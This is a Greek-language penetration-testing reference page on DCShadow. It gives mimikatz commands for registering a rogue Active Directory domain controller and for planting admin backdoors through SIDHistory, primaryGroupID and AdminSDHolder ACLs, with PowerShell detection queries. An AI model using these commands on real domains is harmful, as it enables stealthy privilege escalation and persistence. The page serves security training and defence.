# DCShadow

{{#include ../../banners/hacktricks-training.md}}


## Βασικές πληροφορίες

Καταχωρίζει έναν **νέο Domain Controller** στο AD και τον χρησιμοποιεί για να **προωθήσει attributes** (SIDHistory, SPNs...) σε καθορισμένα objects, **χωρίς** να αφήσει **logs** σχετικά με τις **τροποποιήσεις**. Χρειάζεστε δικαιώματα **DA** και πρέπει να βρίσκεστε μέσα στο **root domain**.\
Σημειώστε ότι αν χρησιμοποιήσετε λανθασμένα δεδομένα, θα εμφανιστούν αρκετά άσχημα logs.<sup>[[2]](#references)</sup>

Για να πραγματοποιήσετε την επίθεση χρειάζεστε 2 instances του mimikatz. Το ένα θα εκκινήσει τους RPC servers με δικαιώματα SYSTEM (εδώ πρέπει να υποδείξετε τις αλλαγές που θέλετε να πραγματοποιήσετε) και το άλλο instance θα χρησιμοποιηθεί για την προώθηση των values:
```bash:mimikatz1 (RPC servers)
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```

```bash:mimikatz2 (push) - Needs DA or similar
lsadump::dcshadow /push
```
Παρατηρήστε ότι το **`elevate::token`** δεν θα λειτουργήσει σε session του `mimikatz1`, καθώς αυτό ανύψωσε τα privileges του thread, ενώ εμείς πρέπει να ανυψώσουμε το **privilege του process**.\
Μπορείτε επίσης να επιλέξετε ένα αντικείμενο "LDAP": `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

Μπορείτε να κάνετε push τις αλλαγές από έναν DA ή από έναν user με τα ελάχιστα αυτά permissions:

- Στο **domain object**:
- _DS-Install-Replica_ (Add/Remove Replica in Domain)
- _DS-Replication-Manage-Topology_ (Manage Replication Topology)
- _DS-Replication-Synchronize_ (Replication Synchornization)
- Το **Sites object** (και τα children του) στο **Configuration container**:
- _CreateChild and DeleteChild_
- Το object του **computer που είναι registered ως DC**:
- _WriteProperty_ (Not Write)
- Το **target object**:
- _WriteProperty_ (Not Write)

Μπορείτε να χρησιμοποιήσετε το [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) για να δώσετε αυτά τα privileges σε έναν unprivileged user (σημειώστε ότι αυτό θα αφήσει ορισμένα logs). Αυτό είναι πολύ πιο restrictive από το να έχετε DA privileges.\
Για παράδειγμα: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` Αυτό σημαίνει ότι το username _**student1**_, όταν είναι logged on στο machine _**mcorp-student1**_, έχει DCShadow permissions πάνω στο object _**root1user**_.

## Χρήση του DCShadow για τη δημιουργία backdoors
```bash:Set Enterprise Admins in SIDHistory to a user
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```

```bash:Chage PrimaryGroupID (put user as member of Domain Administrators)
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```

```bash:Modify ntSecurityDescriptor of AdminSDHolder (give Full Control to a user)
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
### Primary group abuse, enumeration gaps, and detection

- Το `primaryGroupID` είναι ξεχωριστό attribute από τη λίστα `member` του group. Τα DCShadow/DSInternals μπορούν να το γράψουν απευθείας (π.χ. να ορίσουν `primaryGroupID=512` για το **Domain Admins**) χωρίς on-box επιβολή από το LSASS, όμως το AD εξακολουθεί να **μετακινεί** τον χρήστη: η αλλαγή του PGID αφαιρεί πάντα τη συμμετοχή από το προηγούμενο primary group (η ίδια συμπεριφορά ισχύει για οποιοδήποτε target group), επομένως δεν μπορείτε να διατηρήσετε την παλιά primary-group membership.<sup>[[1]](#references)</sup>
- Τα προεπιλεγμένα εργαλεία αποτρέπουν την αφαίρεση ενός χρήστη από το τρέχον primary group του (`ADUC`, `Remove-ADGroupMember`), επομένως η αλλαγή του PGID συνήθως απαιτεί απευθείας directory writes (DCShadow/`Set-ADDBPrimaryGroup`).
- Το membership reporting δεν είναι συνεπές:
- **Περιλαμβάνουν** members που προκύπτουν από primary group: `Get-ADGroupMember "Domain Admins"`, `net group "Domain Admins"`, ADUC/Admin Center.
- **Παραλείπουν** members που προκύπτουν από primary group: `Get-ADGroup "Domain Admins" -Properties member`, ADSI Edit κατά την επιθεώρηση του `member`, `Get-ADUser <user> -Properties memberOf`.
- Οι recursive checks μπορεί να παραλείψουν primary-group members όταν το **primary group** είναι το ίδιο nested (π.χ. το PGID του χρήστη δείχνει σε ένα nested group μέσα στο Domain Admins)· τα `Get-ADGroupMember -Recursive` ή τα LDAP recursive filters δεν θα επιστρέψουν αυτόν τον χρήστη, εκτός αν η recursion επιλύει ρητά τα primary groups.
- DACL tricks: οι attackers μπορούν να **αρνηθούν το ReadProperty** στο `primaryGroupID` του user (ή στο attribute `member` του group για groups που δεν προστατεύονται από το AdminSDHolder), αποκρύπτοντας την effective membership από τα περισσότερα PowerShell queries· το `net group` θα συνεχίσει να επιλύει τη membership. Τα groups που προστατεύονται από το AdminSDHolder θα επαναφέρουν τέτοιες αρνήσεις.

Παραδείγματα detection/monitoring:
```powershell
# Find users whose primary group is not the default Domain Users (RID 513)
Get-ADUser -Filter * -Properties primaryGroup,primaryGroupID |
Where-Object { $_.primaryGroupID -ne 513 } |
Select-Object Name,SamAccountName,primaryGroupID,primaryGroup
```

```powershell
# Find users where primaryGroupID cannot be read (likely denied via DACL)
Get-ADUser -Filter * -Properties primaryGroupID |
Where-Object { -not $_.primaryGroupID } |
Select-Object Name,SamAccountName
```
Ελέγξτε διασταυρωμένα τα privileged groups συγκρίνοντας την έξοδο του `Get-ADGroupMember` με τις εντολές `Get-ADGroup -Properties member` ή το ADSI Edit, ώστε να εντοπίσετε αποκλίσεις που προκαλούνται από το `primaryGroupID` ή hidden attributes.<sup>[[1]](#references)</sup>

## Shadowception - Δώστε DCShadow permissions χρησιμοποιώντας DCShadow (χωρίς modified permissions logs)

Χρειάζεται να προσθέσουμε τα ακόλουθα ACEs με το SID του χρήστη μας στο τέλος:<sup>[[2]](#references)</sup>

- Στο domain object:
- `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
- `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- Στο attacker computer object: `(A;;WP;;;UserSID)`
- Στο target user object: `(A;;WP;;;UserSID)`
- Στο Sites object του Configuration container: `(A;CI;CCDC;;;UserSID)`

Για να λάβετε το τρέχον ACE ενός object: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`

Σημειώστε ότι σε αυτή την περίπτωση πρέπει να κάνετε **αρκετές αλλαγές,** όχι μόνο μία. Επομένως, στο **mimikatz1 session** (RPC server) χρησιμοποιήστε την παράμετρο **`/stack` με κάθε αλλαγή** που θέλετε να κάνετε. Με αυτόν τον τρόπο, θα χρειαστεί να χρησιμοποιήσετε το **`/push`** μόνο μία φορά για να εκτελέσετε όλες τις αλλαγές που έχουν αποθηκευτεί στον rogue server.

[**Περισσότερες πληροφορίες σχετικά με το DCShadow στο ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)

## References

- [1] [TrustedSec - Adventures in Primary Group Behavior, Reporting, and Exploitation](https://trustedsec.com/blog/adventures-in-primary-group-behavior-reporting-and-exploitation)
- [2] [DCShadow write-up in ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)

{{#include ../../banners/hacktricks-training.md}}
